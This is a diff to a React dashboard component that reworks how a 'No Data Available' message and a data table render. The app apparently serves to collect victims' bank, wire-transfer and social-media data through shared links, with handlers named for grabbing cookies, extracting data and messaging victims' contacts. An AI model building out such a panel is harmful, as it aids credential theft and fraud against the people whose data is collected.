@@ -177,59 +177,53 @@ export default function Dashboard() {
     }
   };
 
-  if (showNoDataMessage) {
-    console.log('No Data Condition Met:', {
-      appDataExists: !!appData,
-      dataExists: !!appData?.data?.hub,
-      hubDataExists: !!appData?.data?.hub?.data,
-      hubDataLength: hubData.length
-    });
-    return (
-      <div className="flex flex-col items-center justify-center min-h-[60vh] p-6">
-        <div className="text-center max-w-lg">
-          <h2 className="text-2xl font-bold text-gray-900 mb-4">No Data Available</h2>
-          <p className="text-gray-600 mb-6">
-            To use the dashboard features, first visit the Projects page to get a link and start collecting data.
-          </p>
-          <Link
-            href="/projects"
-            className="inline-flex items-center px-4 py-2 border border-transparent text-base font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700"
-          >
-            Go to Projects
-          </Link>
-        </div>
-      </div>
-    );
-  }
-
   return (
-    <div className="p-6">
-      <div className="flex justify-between items-center mb-6">
-        <h1 className="text-2xl font-bold text-gray-900">Dashboard</h1>
-      </div>
+    <>
+      {showNoDataMessage ? (
+        <div className="flex flex-col items-center justify-center min-h-[60vh] p-6">
+          <div className="text-center max-w-lg">
+            <h2 className="text-2xl font-bold text-gray-900 mb-4">No Data Available</h2>
+            <p className="text-gray-600 mb-6">
+              To use the dashboard features, first visit the Projects page to get a link and start collecting data.
+            </p>
+            <Link
+              href="/projects"
+              className="inline-flex items-center px-4 py-2 border border-transparent text-base font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700"
+            >
+              Go to Projects
+            </Link>
+          </div>
+        </div>
+      ) : (
+        <div className="p-6">
+          <div className="flex justify-between items-center mb-6">
+            <h1 className="text-2xl font-bold text-gray-900">Dashboard</h1>
+          </div>
 
-      <DashboardTabs
-        categories={availableCategories as ('WIRE' | 'BANK' | 'SOCIAL')[]}
-        activeCategory={activeCategory}
-        onCategoryChange={setActiveCategory}
-      />
+          <DashboardTabs
+            categories={availableCategories as ('WIRE' | 'BANK' | 'SOCIAL')[]}
+            activeCategory={activeCategory}
+            onCategoryChange={setActiveCategory}
+          />
 
-      <div className="mt-6">
-        {renderTable()}
-      </div>
+          <div className="mt-6">
+            {renderTable()}
+          </div>
 
-      <ItemDetailsModal
-        isOpen={!!selectedItem}
-        onClose={() => setSelectedItem(null)}
-        data={hubData.find(item => item.id === selectedItem)}
-        category={activeCategory}
-        onVerify={handleVerify}
-        onGetCookie={handleGetCookie}
-        onExtract={handleExtract}
-        onShootContacts={handleShootContacts}
-        onMemoSave={handleMemoSave}
-        loading={loading}
-      />
-    </div>
+          <ItemDetailsModal
+            isOpen={!!selectedItem}
+            onClose={() => setSelectedItem(null)}
+            data={hubData.find(item => item.id === selectedItem)}
+            category={activeCategory}
+            onVerify={handleVerify}
+            onGetCookie={handleGetCookie}
+            onExtract={handleExtract}
+            onShootContacts={handleShootContacts}
+            onMemoSave={handleMemoSave}
+            loading={loading}
+          />
+        </div>
+      )}
+    </>
   );
 }
